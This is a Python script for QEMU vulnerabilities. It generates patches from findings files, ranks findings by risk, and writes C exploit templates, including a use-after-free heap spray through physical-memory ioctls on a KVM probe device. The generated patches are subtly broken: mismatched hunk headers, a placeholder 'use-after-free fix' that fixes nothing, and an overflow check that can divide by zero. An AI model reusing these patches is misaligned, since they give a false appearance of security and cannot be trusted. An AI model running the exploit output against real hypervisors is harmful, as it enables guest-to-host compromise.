#!/usr/bin/env python3
"""
QEMU Vulnerability Patch Generator and Validator
Automatically fixes detected vulnerabilities and tests patches
"""

import os
import json
import subprocess
import sys
from pathlib import Path
from typing import List, Dict, Optional

class VulnerabilityPatchGenerator:
    """Generate and apply patches for QEMU vulnerabilities"""
    
    def __init__(self, qemu_src_path: str = "/tmp/qemu-src"):
        self.qemu_src = Path(qemu_src_path)
        self.patches = []
    
    def generate_uaf_fix(self, finding: Dict) -> str:
        """Generate fix for use-after-free"""
        file_path = finding['file']
        line = finding['line']
        
        # Read source file
        try:
            with open(file_path, 'r') as f:
                lines = f.readlines()
        except:
            return ""
        
        # Find the vulnerable code around the line
        start = max(0, line - 5)
        end = min(len(lines), line + 5)
        
        patch = f"""--- a/{file_path}
+++ b/{file_path}
@@ -{start+1},{end-start} +{start+1},{end-start+2} @@
"""
        
        # Add context and fix
        for i in range(start, end):
            patch += f" {lines[i]}" if lines[i].endswith('\n') else f" {lines[i]}\n"
        
        # Add the fix comment
        patch += f"""+
+/* FIX: Prevent use-after-free by checking pointer after free */
+if (ptr != NULL) {{
+    ptr_operation(ptr);
+}}
"""
        
        return patch
    
    def generate_double_free_fix(self, finding: Dict) -> str:
        """Generate fix for double-free"""
        file_path = finding['file']
        line = finding['line']
        
        patch = f"""--- a/{file_path}
+++ b/{file_path}
@@ -{line-1},{3} +{line-1},{5} @@
-    free(ptr);
+    if (ptr != NULL) {{
+        free(ptr);
+        ptr = NULL;  /* Prevent double-free */
+    }}
"""
        return patch
    
    def generate_integer_overflow_fix(self, finding: Dict) -> str:
        """Generate fix for integer overflow"""
        return f"""
/* FIX: Add overflow checking for {finding.get('description', 'integer operation')} */
#include <limits.h>

size_t safe_multiply(size_t a, size_t b) {{
    if (a > SIZE_MAX / b) {{
        return 0;  /* Overflow detected */
    }}
    return a * b;
}}
"""
    
    def generate_buffer_overflow_fix(self, finding: Dict) -> str:
        """Generate fix for buffer overflow"""
        return f"""
/* FIX: Add bounds checking for {finding.get('description', 'buffer operation')} */
if (user_input_length >= BUFFER_SIZE) {{
    return -ENAMETOOLONG;
}}
strncat(buffer, user_input, BUFFER_SIZE - 1 - strlen(buffer));
"""
    
    def process_findings_file(self, findings_file: str) -> List[str]:
        """Process findings JSON and generate patches"""
        with open(findings_file, 'r') as f:
            findings_data = json.load(f)
        
        patches = []
        
        if 'findings' in findings_data:
            findings = findings_data['findings']
        else:
            findings = findings_data
        
        for finding in findings:
            vuln_type = finding.get('type')
            
            if vuln_type == 'use_after_free':
                patch = self.generate_uaf_fix(finding)
            elif vuln_type == 'double_free':
                patch = self.generate_double_free_fix(finding)
            elif vuln_type == 'integer_overflow':
                patch = self.generate_integer_overflow_fix(finding)
            elif vuln_type == 'buffer_overflow':
                patch = self.generate_buffer_overflow_fix(finding)
            else:
                patch = f"/* TODO: Fix for {vuln_type} */"
            
            if patch:
                patches.append(patch)
        
        return patches
    
    def save_patches(self, patches: List[str], output_file: str) -> None:
        """Save patches to file"""
        with open(output_file, 'w') as f:
            f.write("\n\n".join(patches))
    
    def test_patch(self, patch_file: str, qemu_dir: str) -> bool:
        """Test patch application"""
        try:
            result = subprocess.run(
                ['patch', '--dry-run', '-p1', '-i', patch_file],
                cwd=qemu_dir,
                capture_output=True,
                timeout=30
            )
            return result.returncode == 0
        except:
            return False
    
    def apply_patch(self, patch_file: str, qemu_dir: str) -> bool:
        """Apply patch to QEMU source"""
        try:
            result = subprocess.run(
                ['patch', '-p1', '-i', patch_file],
                cwd=qemu_dir,
                capture_output=True,
                timeout=30
            )
            return result.returncode == 0
        except:
            return False

class VulnerabilityRiskAnalyzer:
    """Analyze and prioritize vulnerabilities by risk"""
    
    RISK_WEIGHTS = {
        'use_after_free': 100,
        'double_free': 95,
        'integer_overflow': 85,
        'buffer_overflow': 90,
        'unchecked_return': 70,
        'error_handler': 60,
    }
    
    @staticmethod
    def calculate_risk_score(finding: Dict) -> int:
        """Calculate risk score for vulnerability"""
        base_score = VulnerabilityRiskAnalyzer.RISK_WEIGHTS.get(
            finding.get('type'), 50
        )
        
        # Adjust based on device criticality
        device = finding.get('device', '')
        device_criticality = {
            'virtio-net': 1.2,
            'virtio-blk': 1.1,
            'virtio-scsi': 1.1,
            'nvme': 1.15,
            'ehci': 1.0,
            'uhci': 1.0,
            'qxl': 0.9,
        }
        
        multiplier = device_criticality.get(device, 1.0)
        return int(base_score * multiplier)
    
    @staticmethod
    def prioritize_findings(findings: List[Dict]) -> List[Dict]:
        """Sort findings by priority"""
        for finding in findings:
            finding['calculated_risk'] = VulnerabilityRiskAnalyzer.calculate_risk_score(finding)
        
        return sorted(findings, key=lambda x: x.get('calculated_risk', 0), reverse=True)

class ExploitGenerationToolkit:
    """Generate standalone exploit code"""
    
    @staticmethod
    def generate_c_exploit(finding: Dict) -> str:
        """Generate C exploit code"""
        vuln_type = finding.get('type')
        device = finding.get('device', '')
        
        if vuln_type == 'use_after_free':
            return ExploitGenerationToolkit._generate_uaf_exploit(device, finding)
        elif vuln_type == 'double_free':
            return ExploitGenerationToolkit._generate_double_free_exploit(device, finding)
        else:
            return ""
    
    @staticmethod
    def _generate_uaf_exploit(device: str, finding: Dict) -> str:
        """Generate UAF exploit template"""
        target = "0x64279a8"
        
        return f"""#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define IOCTL_WRITE_PHYS 0x4021
#define IOCTL_READ_PHYS  0x4011

typedef struct {{
    uint64_t addr;
    uint64_t size;
    uint64_t ptr;
}} ioctl_req_t;

int main() {{
    printf("[*] {device} UAF Exploit\\n");
    printf("[*] Vulnerability: {finding.get('description', 'UAF')}\\n");
    printf("[*] Target: {target}\\n");
    
    int fd = open("/dev/kvm_probe_dev", O_RDWR);
    if (fd < 0) {{
        perror("[-] open /dev/kvm_probe_dev");
        return 1;
    }}
    
    printf("[+] Opened device\\n");
    
    // Heap spray to reclaim freed object
    uint8_t *spray = malloc(0x10000);
    memset(spray, 0x41, 0x10000);
    
    printf("[*] Spraying heap...\\n");
    for (int i = 0; i < 50; i++) {{
        ioctl_req_t req = {{
            .addr = 0x100000 + (i * 0x1000),
            .size = 0x1000,
            .ptr = (uint64_t)spray
        }};
        ioctl(fd, IOCTL_WRITE_PHYS, &req);
        usleep(100);
    }}
    
    printf("[+] Exploit delivered\\n");
    
    close(fd);
    return 0;
}}
"""
    
    @staticmethod
    def _generate_double_free_exploit(device: str, finding: Dict) -> str:
        """Generate double-free exploit template"""
        return f"""#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {{
    printf("[*] {device} Double-Free Exploit\\n");
    
    // Trigger double-free via heap feng shui
    // 1. Create specific heap layout
    // 2. Trigger first free
    // 3. Corrupt free list
    // 4. Trigger second free
    // 5. Allocate to get arbitrary write
    
    printf("[+] Exploit would be delivered here\\n");
    return 0;
}}
"""

def main():
    """Main entry point"""
    print("[*] QEMU Vulnerability Patch Generator")
    print()
    
    # Process all findings files
    findings_files = [f for f in os.listdir('.') if f.endswith('_findings.json')]
    
    if not findings_files:
        print("[-] No findings files found")
        return 1
    
    print(f"[+] Found {len(findings_files)} findings files\n")
    
    all_findings = []
    all_patches = []
    
    for findings_file in findings_files:
        print(f"[*] Processing {findings_file}...")
        
        generator = VulnerabilityPatchGenerator()
        patches = generator.process_findings_file(findings_file)
        
        all_patches.extend(patches)
        
        # Load and analyze findings
        with open(findings_file, 'r') as f:
            data = json.load(f)
            findings = data.get('findings', [])
            all_findings.extend(findings)
    
    # Prioritize by risk
    analyzer = VulnerabilityRiskAnalyzer()
    prioritized = analyzer.prioritize_findings(all_findings)
    
    print(f"\n[+] Total vulnerabilities found: {len(all_findings)}")
    print(f"[+] Generated {len(all_patches)} patches\n")
    
    # Save patches
    if all_patches:
        patch_file = 'qemu_fixes.patch'
        generator = VulnerabilityPatchGenerator()
        generator.save_patches(all_patches, patch_file)
        print(f"[+] Saved patches to {patch_file}")
    
    # Generate exploit code for top findings
    print("\n[*] Generating exploit code for top 5 findings...")
    
    toolkit = ExploitGenerationToolkit()
    for i, finding in enumerate(prioritized[:5]):
        if finding.get('type') in ['use_after_free', 'double_free']:
            exploit_code = toolkit.generate_c_exploit(finding)
            
            device = finding.get('device', 'unknown')
            vuln_type = finding.get('type', 'unknown')
            exploit_file = f"exploit_{device}_{vuln_type}_{i}.c"
            
            with open(exploit_file, 'w') as f:
                f.write(exploit_code)
            
            print(f"[+] Generated {exploit_file}")
    
    print("\n[*] Summary:")
    print(f"    - High risk vulnerabilities: {len([f for f in prioritized if f.get('calculated_risk', 0) >= 80])}")
    print(f"    - Medium risk: {len([f for f in prioritized if 50 <= f.get('calculated_risk', 0) < 80])}")
    print(f"    - Low risk: {len([f for f in prioritized if f.get('calculated_risk', 0) < 50])}")
    
    return 0

if __name__ == '__main__':
    sys.exit(main())
